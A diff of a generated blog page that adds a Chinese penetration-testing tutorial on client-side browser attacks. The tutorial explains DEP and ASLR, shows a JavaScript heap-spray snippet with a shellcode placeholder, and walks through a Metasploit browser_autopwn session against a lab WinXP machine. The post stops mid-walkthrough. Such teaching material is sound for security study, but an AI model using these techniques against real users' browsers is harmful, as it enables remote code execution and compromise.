@@ -259,9 +259,15 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">0</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">1,629</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -390,7 +396,29 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <blockquote>
+<p>客户端攻击(Client-side-Exploit)值攻击者构造畸形数据发送给目标主机，用户在使用该含有漏洞的客户端应用程序处理这些数据时，发生程序内部处理流程的错误，执行了内嵌与数据中的恶意代码，从而导致了渗透入侵。常见于浏览器、Office为代表的流行应用软件。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="客户端渗透攻击特点"><a href="#客户端渗透攻击特点" class="headerlink" title="客户端渗透攻击特点"></a>客户端渗透攻击特点</h3><p>　　应用程序一般有三个模式：客户端/服务端模式(C/S)、浏览器/服务端模式(B/S)、纯客户端模式。<br>　　客户端渗透就是针对这些客户端应用软件的渗透攻击。浏览器/服务端模式的攻击，以IE浏览器距离，攻击者发送一个访问连接给用户，该链接指向服务器上的一个恶意网页，用户访问该网页就会触发安全漏洞，执行嵌在网页内部的恶意代码，导致攻击发生。<br>　　出客户端模式的攻击如Adobe、Office为例，通过社会工程学探测到目标用户的邮箱，即时通信账户个人信息，净额以文档发送给用户，打开文档就会触发恶意漏洞。
+　　</p>
+<h3 id="安全防护机制"><a href="#安全防护机制" class="headerlink" title="安全防护机制"></a>安全防护机制</h3><ol>
+<li><p>DEP（数据执行保护）<br>　　基本原理是操作系统通过设置内存也得操作，知名数据所在的内存也为不可执行。若在这种页面执行指令，CPU会抛出异常。所以DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD是No-Execute Page-Protection(NX)，Intel的是Execute Disable Bit(XD)。</p>
+</li>
+<li><p>ASLR(地址空间布局随机化)<br>　　指系统在运行时，不用固定的基地址加载进程及相关的库文件。主要包括一下几个方面：堆地址的随机化、栈地址的随机化、PE文件基址的随机化、PE文件映像机制的随机化、PEB(Process Environment Block)、TEB(Thread Environment Block 或 Win32 Thread Information Block(TIB))地址的随机化。</p>
+</li>
+</ol>
+<h2 id="针对浏览器的渗透攻击"><a href="#针对浏览器的渗透攻击" class="headerlink" title="针对浏览器的渗透攻击"></a>针对浏览器的渗透攻击</h2><h3 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h3><p>　　主要包括两大类：<br>　　1. 对浏览器程序本身的渗透攻击<br>　　2. 对浏览器内嵌的渗透攻击<br>　　<br>　　Metasploit的针对windows系统下浏览器渗透攻击模块位于/exploits/windows/browser</p>
+<h3 id="堆喷射利用方式"><a href="#堆喷射利用方式" class="headerlink" title="堆喷射利用方式"></a>堆喷射利用方式</h3><blockquote>
+<p>In computer security, heap spraying is a technique used in exploits to facilitate arbitrary code execution. The part of the source code of an exploit that implements this technique is called a heap spray.[1] In general, code that sprays the heap attempts to put a certain sequence of bytes at a predetermined location in the memory of a target process by having it allocate (large) blocks on the process’s heap and fill the bytes in these blocks with the right values.</p>
+</blockquote>
+<p>　　堆喷射技术本身并不能造成什么安全问题，但是通过对喷射可以提高渗透成功的几率。<br>　　<br>　　大部分针对浏览器的渗透攻击都会涉及该技术，主要由于在溢出客户端程序后，还要去执行不知在缓冲区的Shellcode，而Shellcode的地址必须是事先准备好的。在操作系统堆栈缓冲区加强后，攻击者在溢出楼哦东之后可能只能改变一个4字节程序内部的指针，难以一开溢出这个漏洞来获得一个稳定缓冲区来布置Shellcode。所以在溢出漏洞前，需要寻找一个稳定的内存区来存放Shellcode。。<br>　　<br>　　堆喷射就是这样工作的，在溢出漏洞前，攻击者在兑取申请大量充满控制领的内存块，每个都尾随Shellcode。在溢出之后，根据内存块总体的大小，修改溢出知乎返回地址到这个对空间。由于空指令在这个空间中占了绝大部分提及，所以更大的可能性是返回地址在空指令区，而不是Shellcode所在的空间，这样当跳转至这段空间时，程序会先执行空指令，今儿花型到Shellcode。<br>　　<br>　　一般使用Javacript脚本进行对喷射。
+　　</p>
+<h3 id="堆喷射例子"><a href="#堆喷射例子" class="headerlink" title="堆喷射例子"></a>堆喷射例子</h3><p>　　下面Js代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">js = %Q|</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>(%u9090%u9090);</span><br><span class="line"><span class="keyword">var</span> shell = <span class="built_in">unescape</span>(<span class="string">"#&#123;shellcode&#125;"</span>);    <span class="comment">//恶意构造的Shellcode</span></span><br><span class="line"><span class="keyword">while</span>(nop.length&lt;=<span class="number">0x100000</span>/<span class="number">2</span>)&#123;nop+=nop;&#125;</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)&#123;slide[i] = nop+shell&#125;</span><br><span class="line">|</span><br></pre></td></tr></table></figure></p>
+<p>　　while进行后nop字符串长度为1048576，即1MB，最终分配了200块1MB的内存，每块内存的最后会加上一段Shellcode代码，这就算布置好Shellcode了。下来利用一个地址作为溢出漏洞之后的程序跳转地址，这里使用0x0C0C0C0C。<br>　　使用0x0C0C0C0C原因：200MB的内存空间即从0x00000000 ~ 0x0c800000。0x0C800000大于0x0C0C0C0C，所以只要程序在申请堆内存之前没有用掉这段空间，就可以使这个地址在布置的缓冲区内。<br>　　使用0x0C0C0C0C而不是0x0a0a0a0a是因为堆增长的方式是从低地址向高地址增加的，地址越高被程序提前占用的可能越小。0C是为了考虑4字节对齐问题，只要覆盖了附表地址，就肯定是0x0C0C0C0C，而不会是别的。在比0x0c800000小的地址符合条件的只有0x0C0C0C0C。<strong>除此之外0x0C0C0C0C也可作为空指令来顶替前面的0x90909090等等来填充堆区，这样的话就相当于在做堆喷射</strong>。0x0C0C0C0C不唯一，要根据申请空间的大小来选择地址。<br>　　<br>　　2010年的BlackHat上便提出了JIT Spraying，吸收了堆喷射的思想，绕过了Windows7的DEP+ASLR组合。
+　　</p>
+<h3 id="MSF中自动化浏览器攻击"><a href="#MSF中自动化浏览器攻击" class="headerlink" title="MSF中自动化浏览器攻击"></a>MSF中自动化浏览器攻击</h3><p>　　下面使用msf中的server/browser_sutopwn模块演示对WinXP SP3浏览器的攻击过程<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/browser_autopwn):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   LHOST                     yes       The IP address to use <span class="keyword">for</span> reverse-connect payloads</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The <span class="built_in">local</span> host to listen on. This must be an address on the <span class="built_in">local</span> machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             yes       The <span class="built_in">local</span> port to listen on.</span><br><span class="line">   SSL      <span class="literal">false</span>            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name       Description</span><br><span class="line">   ----       -----------</span><br><span class="line">   WebServer  Start a bunch of modules and direct clients to appropriate exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; <span class="built_in">set</span> LHOST 10.10.10.128</span><br><span class="line">LHOST =&gt; 10.10.10.128</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; <span class="built_in">set</span> SRVHOST 10.10.10.128</span><br><span class="line">SRVHOST =&gt; 10.10.10.128</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; <span class="built_in">set</span> URIPATH auto</span><br><span class="line">URIPATH =&gt; auto</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; run </span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Setup</span><br><span class="line">msf5 auxiliary(server/browser_autopwn) &gt; </span><br><span class="line">[*] Starting exploit modules on host 10.10.10.128...</span><br><span class="line">[*] ---</span><br><span class="line"> <span class="comment"># 使用WinXP客户机访问10.10.10.128攻击机的80端口</span></span><br></pre></td></tr></table></figure></p>
+
     </article>
     <!-- license  -->
     
@@ -404,6 +432,11 @@ height:50vh;
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/kali-渗透测试-信息收集/" title= kali-渗透测试-信息收集 >
+                    <div class="nextTitle">kali-渗透测试-信息收集</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -530,7 +563,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端渗透攻击特点"><span class="toc-number">1.1.</span> <span class="toc-text">客户端渗透攻击特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安全防护机制"><span class="toc-number">1.2.</span> <span class="toc-text">安全防护机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#针对浏览器的渗透攻击"><span class="toc-number">2.</span> <span class="toc-text">针对浏览器的渗透攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击面"><span class="toc-number">2.1.</span> <span class="toc-text">攻击面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆喷射利用方式"><span class="toc-number">2.2.</span> <span class="toc-text">堆喷射利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆喷射例子"><span class="toc-number">2.3.</span> <span class="toc-text">堆喷射例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF中自动化浏览器攻击"><span class="toc-number">2.4.</span> <span class="toc-text">MSF中自动化浏览器攻击</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1124,9 +1157,46 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 41
+        Total : 42
         </div>
         <!-- search  -->
         
@@ -1139,6 +1209,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/kali-渗透测试-信息收集/" >kali-渗透测试-信息收集</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1361,11 +1436,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Javascript"><span class="iconfont-archer">&#xe606;</span>Javascript</span>
     
-        <span class="sidebar-tag-name" data-tags="BOM"><span class="iconfont-archer">&#xe606;</span>BOM</span>
-    
         <span class="sidebar-tag-name" data-tags="Bugku"><span class="iconfont-archer">&#xe606;</span>Bugku</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="BOM"><span class="iconfont-archer">&#xe606;</span>BOM</span>
     
         <span class="sidebar-tag-name" data-tags="CSS"><span class="iconfont-archer">&#xe606;</span>CSS</span>
     
@@ -1384,6 +1459,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="安恒月赛"><span class="iconfont-archer">&#xe606;</span>安恒月赛</span>
     
         <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
